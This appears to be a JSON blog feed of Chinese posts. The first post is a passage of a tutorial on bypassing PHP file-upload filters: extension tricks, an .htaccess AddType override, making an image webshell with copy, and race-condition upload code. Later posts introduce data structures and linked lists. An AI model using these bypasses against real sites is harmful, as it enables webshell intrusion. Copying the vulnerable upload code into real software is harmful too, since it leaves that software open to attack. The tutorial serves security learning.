键的数组</p>\n<p><strong>关联数组</strong></p>\n<p>带有指定的键的数组，每个键关联一个值</p>\n<p><strong>多维数组</strong></p>\n<p>包含一个或多个数组的数组</p>\n<p><strong>trim()</strong> 函数移除字符串两侧的空白字符或其他预定义字符。</p>\n<p>相关函数：</p>\n<p>**ltrim()**： 移除字符串左侧的空白字符或其他预定义字符。</p>\n<p><strong>rtrim()</strong> 移除字符串右侧的空白字符或其他预定义字符。</p>\n<p><strong>strtolower(string)</strong> 函数把字符串转换为小写。</p>\n<p><strong>str_ireplace()</strong> 函数替换字符串中的一些字符（不区分大小写）</p>\n<p><strong>in_array()</strong> 函数搜索数组中是否存在指定的值。如果在数组中找到值则返回 TRUE，否则返回 FALSE</p>\n<h4 id=\"绕过方法-1\"><a href=\"#绕过方法-1\" class=\"headerlink\" title=\"绕过方法\"></a>绕过方法</h4><p>只需要构造黑名单以外的后缀名即可进行绕过，所以我们上传后缀名为<code>.php1、.php2、phtml</code>等等都可以完成绕过，然后成功上传了一句话木马，用菜刀或者蚁剑连接即可</p>\n<h4 id=\"注意\"><a href=\"#注意\" class=\"headerlink\" title=\"注意\"></a>注意</h4><p>要在apache的httpd.conf中有如下配置代码：AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht，如果不配置他是无法解析php5代码的</p>\n<p>PHPStudy中AddType application&#x2F;x-httpd-php等Apache命令之所以在Apache的设置文件中设置后未实现目标效果是由于PHP的版本不符导致的，但注意这里的PHP版本并不是指PHP7.3.0、PHP7.4.0这种版本号，也不是适用于32位的PHP、适用于64位的PHP这种不同机型的版本，而<strong>是PHP的NTS(Non Thread Safe)与TS(Thread Safe)的这种不同版本导致的</strong>。</p>\n<h3 id=\"htaccess文件绕过\"><a href=\"#htaccess文件绕过\" class=\"headerlink\" title=\".htaccess文件绕过\"></a>.htaccess文件绕过</h3><p>.htaccess文件，全称是超文本入口，提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。</p>\n<p>.htaccess文件内容</p>\n<p>AddType application&#x2F;x-httpd-php .jpg</p>\n<p>这样配置有一个问题，apache会将所有的文件当作php文件解析，这样会明显影响系统的功能，改进代码如下，这样系统就只对文件名包含“info.png”字符串的文件进行解析. &lt;FilesMatch “info.png”&gt; setHandler application&#x2F;x-httpd-php </FilesMatch></p>\n<h4 id=\"注意-1\"><a href=\"#注意-1\" class=\"headerlink\" title=\"注意\"></a>注意</h4><p>.htaccess文件没有名字，他就是.htaccess文件，如果你将他改为4.htaccess或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。</p>\n<p><em>如果以上操作都弄好了，还是出不来，还是去改phpstudy配置文件，其他选项菜单–打开配置文件—httpd.conf</em></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2509712-20211105170239261-2058341176.png\" alt=\"img\"></p>\n<p>箭头指向位置一开始none,改为all保存，重启phpstudy，就可以了。</p>\n<h6 id=\"大小写绕过\"><a href=\"#大小写绕过\" class=\"headerlink\" title=\"大小写绕过\"></a>大小写绕过</h6><p>代码中没有对后缀名进行大小写过滤，而且windows对大小写不敏感</p>\n<h6 id=\"空格绕过\"><a href=\"#空格绕过\" class=\"headerlink\" title=\"空格绕过\"></a>空格绕过</h6><p>前提：Windows下xx.jpg[空格] 或者xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认去除空格或点</p>\n<p>它没有trim()函数，也就是用来去除字符串两端的空格，所以我们如果在上传文件的后缀名里面加上空格，它在黑名单之外，我们就可以成功进行上传</p>\n<h6 id=\"点绕过\"><a href=\"#点绕过\" class=\"headerlink\" title=\"点绕过\"></a>点绕过</h6><p>它没有deldot()函数，也就是不会删除我们文件名末尾的点(.)，所以我们可以上传带有小数点的后缀名来进行绕过</p>\n<h6 id=\"流文件绕过\"><a href=\"#流文件绕过\" class=\"headerlink\" title=\"流文件绕过\"></a>流文件绕过</h6><p>我们可以在后缀名后面加上::$DATA来进行绕过。</p>\n<h6 id=\"点空格点绕过\"><a href=\"#点空格点绕过\" class=\"headerlink\" title=\"点空格点绕过\"></a>点空格点绕过</h6><p>它没有循环验证，也就是说这些收尾去空，删除末尾的点，去除字符串::$DATA，转换为小写这些东西只是验证了一次。所以我们的绕过思路就很简单，在数据包中把后缀名改为.php. .</p>\n<h6 id=\"后缀名双写绕过\"><a href=\"#后缀名双写绕过\" class=\"headerlink\" title=\"后缀名双写绕过\"></a>后缀名双写绕过</h6><pre class=\"line-numbers language-none\"><code class=\"language-none\">$file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>它将$deny_ext这个数组里的数据都替换成了空，参考sql注入里的双写便可完成绕过。</p>\n<p>1.phphpp</p>\n<p>1.php</p>\n<h2 id=\"图片马绕过\"><a href=\"#图片马绕过\" class=\"headerlink\" title=\"图片马绕过\"></a>图片马绕过</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">function getReailFileType($filename)&#123;\n    $file &#x3D; fopen($filename, &quot;rb&quot;);&#x2F;&#x2F;打开一个文件或 URL。&quot;rb&quot; 以二进制方式打开。\n    $bin &#x3D; fread($file, 2); &#x2F;&#x2F;只读2字节\n    fclose($file);\n    $strInfo &#x3D; @unpack(&quot;C2chars&quot;, $bin);    \n    $typeCode &#x3D; intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);    \n    $fileType &#x3D; &#39;&#39;;    \n    switch($typeCode)&#123;      \n        case 255216:            \n            $fileType &#x3D; &#39;jpg&#39;;\n            break;\n        case 13780:            \n            $fileType &#x3D; &#39;png&#39;;\n            break;        \n        case 7173:            \n            $fileType &#x3D; &#39;gif&#39;;\n            break;\n        default:            \n            $fileType &#x3D; &#39;unknown&#39;;\n        &#125;    \n        return $fileType;\n&#125;\n\n$is_upload &#x3D; false;\n$msg &#x3D; null;\nif(isset($_POST[&#39;submit&#39;]))&#123;\n    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];\n    $file_type &#x3D; getReailFileType($temp_file);\n\n    if($file_type &#x3D;&#x3D; &#39;unknown&#39;)&#123;\n        $msg &#x3D; &quot;文件未知，上传失败！&quot;;\n    &#125;else&#123;\n        $img_path &#x3D; UPLOAD_PATH.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;\n        if(move_uploaded_file($temp_file,$img_path))&#123;\n            $is_upload &#x3D; true;\n        &#125; else &#123;\n            $msg &#x3D; &quot;上传出错！&quot;;\n        &#125;\n    &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>图片马制作方法： copy a.jpg &#x2F;b + shell.php &#x2F;a shell.jpg &#x2F;b 表示一个二进制文件 + 表示将多个文件合并成一个文件 &#x2F;a 表示一个ASCII文本文件</p>\n<p>fopen() 函数打开一个文件或 URL。”rb” 以二进制方式打开。</p>\n<p>fread() 函数读取打开的文件。</p>\n<p>fclose() 函数关闭一个打开文件</p>\n<p>unpack() 函数从二进制字符串对数据进行解包。</p>\n<p>intval()函数用于获取变量的整数值。</p>\n<h2 id=\"条件竞争上传\"><a href=\"#条件竞争上传\" class=\"headerlink\" title=\"条件竞争上传\"></a>条件竞争上传</h2><p>条件竞争漏洞是一种服务器端漏洞，由于服务器端在处理用户请求时，是并发进行的，因此 如果并非处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$is_upload &#x3D; false;\n$msg &#x3D; null;\n\nif(isset($_POST[&#39;submit&#39;]))\n&#123;\n    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);\n    $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];\n    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];\n    $file_ext &#x3D; substr($file_name,strrpos($file_name,&quot;.&quot;)+1);\n    $upload_file &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $file_name;\n\n    if(move_uploaded_file($temp_file, $upload_file))\n    &#123;\n        if(in_array($file_ext,$ext_arr))\n        &#123;\n             $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;\n             rename($upload_file, $img_path);&#x2F;&#x2F;将$upload_file名字改为$img_path\n             $is_upload &#x3D; true;\n        &#125;\n     else\n        &#123;\n            $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;\n            unlink($upload_file);\n        &#125;\n    &#125;else&#123;\n        $msg &#x3D; &#39;上传出错！&#39;;\n    &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>strrpos() 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）</p>\n<p>substr() 函数返回字符串的一部分。</p>\n<p>rename() 函数重命名文件或目录。若成功，则该函数返回 true。若失败，则返回 false。</p>\n<p>unlink() 函数删除文件。如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p>\n",
            "tags": [
                "Web",
                "文件上传"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/",
            "url": "https://blog.xcu.icu/2022/10/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/",
            "title": "数据结构与算法入门",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<p>[TOC]</p>\n<h1 id=\"1，数据结构与算法入门\"><a href=\"#1，数据结构与算法入门\" class=\"headerlink\" title=\"1，数据结构与算法入门\"></a>1，数据结构与算法入门</h1><p><code>程序=数据结构+算法</code></p>\n<p><code>研究非数值计算的程序设计问题中计算机的操作对象以及它们之间的关系和操作</code></p>\n<p>因为操作对象和操作对象之间的关系不同产生不同的数据结构</p>\n<h2 id=\"算法\"><a href=\"#算法\" class=\"headerlink\" title=\"算法\"></a>算法</h2><p>何为算法，使用计算机C语言编程计算1到100的和（1+2+3+……+100）多数会给出这样的答案</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> ans<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;=</span><span class=\"token number\">100</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        ans<span class=\"token operator\">+=</span>i<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span>ans<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>循环计算了一百次，但是如果我们使用等差数列求和</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> ans<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">+</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">100</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span>ans<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>使用更加简单的方式，用较小的计算量完成计算</p>\n<h3 id=\"算法的特性\"><a href=\"#算法的特性\" class=\"headerlink\" title=\"算法的特性\"></a>算法的特性</h3><ol>\n<li>输入输出：<br>算法具有0个或者多个输入，至少一个输出</li>\n<li>确定性：<br>算法的每一步都具有确定的含义，无二义性，即相同的输入得到的输出结果相同</li>\n<li>有穷性<br>每个算法都应该在有限的时间内完成</li>\n<li>可行性<br>一个算法是可以被执行的，即算法的每个操作都可以通过已经实现的基本运算执行有限次数来完成</li>\n</ol>\n<h3 id=\"算法的设计要求\"><a href=\"#算法的设计要求\" class=\"headerlink\" title=\"算法的设计要求\"></a>算法的设计要求</h3><ol>\n<li>正确性：算法能够满足指定的功能，能够得到正确答案</li>\n<li>健壮性：当输入的数据不合法时，也能够做出相应的处理</li>\n<li>可读性：指算法是可以阅读，理解和交流的</li>\n<li>耗时低占用空间少（高效性）：运行时间（Running time）与占用空间（Storage space）概念，在设计算法时，我们总是希望能够更少的使用时间和空间达成我们的目标。</li>\n</ol>\n<h2 id=\"基本概念和术语\"><a href=\"#基本概念和术语\" class=\"headerlink\" title=\"基本概念和术语\"></a>基本概念和术语</h2><p>数据是信息的载体，是可以被计算机识别，存储并加工处理的描述客观事物的信息符号的总称</p>\n<p>数据元素是数据的基本单位，数据元素由若干数据项组成<br>数据项是构成数据元素的最小单位</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905152622667.png\" alt=\"image-20220905152622667\"></p>\n<p>数据对象：相同性质数据元素的集合，是数据的一个子集</p>\n<p>数据结构：数据结构&#x3D;数据对象+结构（带结构的数据对象）<br>数据对象不是孤立存在的，他们之间存在某种关系，数据对象之间的关系成为结构</p>\n<h2 id=\"数据结构\"><a href=\"#数据结构\" class=\"headerlink\" title=\"数据结构\"></a>数据结构</h2><p>数据结构的两个层次：</p>\n<p>1、逻辑结构</p>\n<ol>\n<li>数据的逻辑结构是从数据元素的逻辑关系上描述数据的。</li>\n<li>是指数据元素之间的逻辑关系的整体，通常是从求解问题中提<br>炼出来的。</li>\n<li>数据逻辑结构与数据的存储无关，是独立于计算机的。</li>\n</ol>\n<p>2、物理结构</p>\n<ul>\n<li>数据元素及其关系在计算机存储器中的存储方式。</li>\n</ul>\n<p>逻辑结构实例</p>\n<ul>\n<li>集合</li>\n</ul>\n<p>数据元素只是属于一个集合，无其他关系</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220906150436900.png\" alt=\"image-20220906150436900\"></p>\n<ul>\n<li>线性结构</li>\n</ul>\n<p>一对一，线性表，栈，队列</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220906150444092.png\" alt=\"image-20220906150444092\"></p>\n<ul>\n<li>树形结构</li>\n</ul>\n<p>一对多</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220906150452330.png\" alt=\"image-20220906150452330\"></p>\n<ul>\n<li>图形结构</li>\n</ul>\n<p>多对多</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220906150458844.png\" alt=\"image-20220906150458844\"></p>\n<p>接下来一个列题</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905155124056.png\" alt=\"image-20220905155124056\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905155321699.png\" alt=\"image-20220905155321699\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905155137275.png\" alt=\"image-20220905155137275\"></p>\n<p>数据结构分3个方面</p>\n<p>逻辑结构，储存结构，数据运算</p>\n<p>数据元素之间的逻辑关系是数据的逻辑结构</p>\n<p>数据元素及其关系在计算器中的储存方式是数据的储存结构（物理结构）</p>\n<p>施加在该数据上面的操作是数据运算</p>\n<p><code>同一逻辑可以对应多种储存结构</code><br><code>同样的运算，在不同的储存结构中，其实现过程是不同的</code></p>\n<h2 id=\"存储结构\"><a href=\"#存储结构\" class=\"headerlink\" title=\"存储结构\"></a>存储结构</h2><p>顺序储存：</p>\n<p>借助元素在存储器中的相应位置来表示数据元素间的逻辑关系</p>\n<p>链式存储结构</p>\n<p>借助指示元素存储地址的指针表示数据元素间的逻辑关系</p>\n<h2 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h2><p>数据类型是一个值的集合和定义在此集合上的一组操作的总称</p>\n<p>数据类型和数据结构之间的关系：数据类型就是已经实现了的数据结构</p>\n<h3 id=\"抽象数据类型（ADT）：\"><a href=\"#抽象数据类型（ADT）：\" class=\"headerlink\" title=\"抽象数据类型（ADT）：\"></a>抽象数据类型（ADT）：</h3><p>更高层次的数据对象，可以通过固有的数据类型来表示或实现</p>\n<p>抽象数据类型（Abstract Data Type，ADT）只是一个数学模型以及定义在模型上的一组操作。通常是对数据的抽象，定义了数据的取值范围以及对数据操作的集合。</p>\n<h2 id=\"算法分析\"><a href=\"#算法分析\" class=\"headerlink\" title=\"算法分析\"></a>算法分析</h2><h3 id=\"算法的时间复杂度\"><a href=\"#算法的时间复杂度\" class=\"headerlink\" title=\"算法的时间复杂度\"></a>算法的时间复杂度</h3><p>时间复杂度表示一个程序运行所需要的时间，其具体需要在机器环境中才能得到具体的值，但我们一般并不需要得到详细的值，只是需要比较快慢的区别即可</p>\n<p>时间频度中，n称为问题的规模，当n不断变化时,时间频度T(n)也会不断变化。<br>T（n)&#x2F;f(n)的极限值为不等于零的常数，则称f(n)是T(n)的同数量级函数。记作T(n)&#x3D;Ｏ(f(n)),称Ｏ(f(n)) 为算法的渐进时间复杂度，简称时间复杂度。</p>\n<h4 id=\"度量时间复杂度的两种方法\"><a href=\"#度量时间复杂度的两种方法\" class=\"headerlink\" title=\"度量时间复杂度的两种方法\"></a>度量时间复杂度的两种方法</h4><ol>\n<li><h3 id=\"事后统计法\"><a href=\"#事后统计法\" class=\"headerlink\" title=\"事后统计法\"></a>事后统计法</h3><p>在程序运行结束之后直接查看运行时间的方式进行时间复杂度的统计<br>（特别依赖计算机环境，算法的测试困难，有时一套算法需要海量的数据才能真正比较出效果）</p>\n</li>\n<li><h3 id=\"事先估计法\"><a href=\"#事先估计法\" class=\"headerlink\" title=\"事先估计法\"></a>事先估计法</h3><p>事先统计法采取在计算机编译程序前对该算法进行预估的方式估算。</p>\n</li>\n</ol>\n<h3 id=\"算法的空间复杂度\"><a href=\"#算法的空间复杂度\" class=\"headerlink\" title=\"算法的空间复杂度\"></a>算法的空间复杂度</h3><p>一个程序的空间复杂度是指运行完一个程序所需内存的大小，其包括两个部分。</p>\n<p>a)固定部分。这部分空间的大小与输入&#x2F;输出的数据的个数多少、数值无关。主要包括指令空间（即代码空间）、数据空间（常量、简单变量）等所占的空间。这部分属于静态空间。</p>\n<p>b)可变空间，这部分空间的主要包括动态分配的空间，以及递归栈所需的空间等。这部分的空间大小与算法有关。</p>\n<h2 id=\"程序允许时的内存与地址\"><a href=\"#程序允许时的内存与地址\" class=\"headerlink\" title=\"程序允许时的内存与地址\"></a>程序允许时的内存与地址</h2><h3 id=\"内存\"><a href=\"#内存\" class=\"headerlink\" title=\"内存\"></a>内存</h3><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220913002747179.png\" alt=\"image-20220913002747179\"></p>\n<p>首先看这张图，可以看到每一个数据都有一个地址与其对应，也是因为有地址的存在，我们才可以使用计算机轻易的去访问一个数据</p>\n<p>接下来可以用一串c语言代码来体现数据喝地址的关系</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> array<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">\"ACDEQSFVCK\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">10</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The %c Address is %x \\n\"</span><span class=\"token punctuation\">,</span>array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token comment\">//%x可以换成%p都是十六进制表示，只不过%p会把所有的位数显示出来</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220913004106041.png\" alt=\"image-20220913004106041\"></p>\n<p>可以看到这是一段连续的地址，当你把char类型换成int型之后可能又不太一样，因为char是1字节的，而int占4字节，所以int的地址会变成4个一跳的方式往上增长。</p>\n<h2 id=\"两个必须学会的函数知识\"><a href=\"#两个必须学会的函数知识\" class=\"headerlink\" title=\"两个必须学会的函数知识\"></a>两个必须学会的函数知识</h2><h3 id=\"1-Malloc函数\"><a href=\"#1-Malloc函数\" class=\"headerlink\" title=\"1. Malloc函数\"></a>1. Malloc函数</h3><p>malloc（）函数在堆中申请分配一个大小为size个字节的连续内存空间，若成功分配，则返回一个指向所分配空间起始地址的指针，否则返回空指针（NULL）。</p>\n<h3 id=\"2-Free函数\"><a href=\"#2-Free函数\" class=\"headerlink\" title=\"2.Free函数\"></a>2.Free函数</h3><p>free（）函数用来释放已分配的内存空间，参数p是待释放的内存空间的首指针</p>\n<p>总结来说malloc就是用来申请内存空间，而free是为了释放内存空间</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>p<span class=\"token punctuation\">;</span>     <span class=\"token comment\">//定义一个指向整形的指针变量</span>\n    p<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//申请5个整形大小的内存空间并返回起始地址给p</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">==</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>    <span class=\"token comment\">//申请失败</span>\n        <span class=\"token comment\">//执行申请失败的代码，一般print一个报错</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">//退出</span>\n    <span class=\"token punctuation\">&#125;</span>\n    p<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//为空间中添加数据</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//打印这个数据</span>\n    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">//释放p的内存空间，此时p依旧存在，只不过失去了指向的对象，成了野指针</span>\n    p<span class=\"token operator\">=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//为其赋NULL，此时它不再是一个野指针</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>整个内存申请释放的过程</p>\n",
            "tags": [
                "数据结构",
                "数据结构与算法"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/%E9%93%BE%E8%A1%A8/",
            "url": "https://blog.xcu.icu/2022/10/24/%E9%93%BE%E8%A1%A8/",
            "title": "循序表",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"线性表\"><a href=\"#线性表\" class=\"headerlink\" title=\"线性表\"></a>线性表</h2><p>一个具有相同性质的的数据元素的序列</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220913151550098.png\" alt=\"image-20220913151550098\"></p>\n<h2 id=\"顺序存储和链式存储\"><a href=\"#顺序存储和链式存储\" class=\"headerlink\" title=\"顺序存储和链式存储\"></a>顺序存储和链式存储</h2><h3 id=\"顺序存储\"><a href=\"#顺序存储\" class=\"headerlink\" title=\"顺序存储\"></a>顺序存储</h3><p>什么是顺序储存呢？</p>\n<p>我们学c语言没多久就接触到了数组这个概念，这里所了解到的数组就是顺序储存<br>我们在很多地方都会用到数组使得我们的算法实现更加简单，但是当我们想要删除某个或者在某个位置加入一个元素的时候就会非常的麻烦</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220913005607258.png\" alt=\"image-20220913005607258\"></p>\n<p>如上图中，如果我们想在12之间加入一个字母A，那么我们就需要将所有的元素后移一位，缺点很明显</p>\n<ul>\n<li>数据量大的时候需要移动大量数据，不符合算法的设计要求</li>\n<li>数组需要开一个庞大的空间为了防止溢出</li>\n</ul>\n<p>为了解决这些问题我们可以选用链式存储的方式</p>\n<h3 id=\"链式存储\"><a href=\"#链式存储\" class=\"headerlink\" title=\"链式存储\"></a>链式存储</h3><p>链表通过不连续的储存方式配合指针的灵活运用，减少计算量，并且链表是自适应大小的，也就是说理论上链表空间可以无限大（小于机器承载）</p>\n<p>链表的基本思维是利用结构体的设置，额外开辟出一条内存空间去作指针，她总是指向下一个结点，各个结点通过NEXT相互联系</p>\n<p>一个结点如下图</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220913010445304.png\" 